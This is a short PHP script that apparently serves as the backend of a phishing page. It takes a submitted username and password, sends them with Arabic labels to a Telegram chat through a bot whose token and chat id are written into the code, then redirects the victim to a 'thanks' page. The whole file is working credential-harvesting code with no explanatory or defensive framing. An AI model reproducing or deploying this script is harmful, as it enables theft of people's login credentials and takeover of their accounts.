<?php
$token = "8325350184:AAGjeAhaf4jcIXDsVP1Ua25XW-8pu6_3SH4";
$chat_id = "1408481914";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $message = "📩 تسجيل دخول جديد:\n";
    $message .= "👤 المستخدم: $username\n";
    $message .= "🔐 الرمز: $password";

    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message
    ];

    file_get_contents($url . "?" . http_build_query($data));

    header("Location: thanks.html");
    exit();
}
?>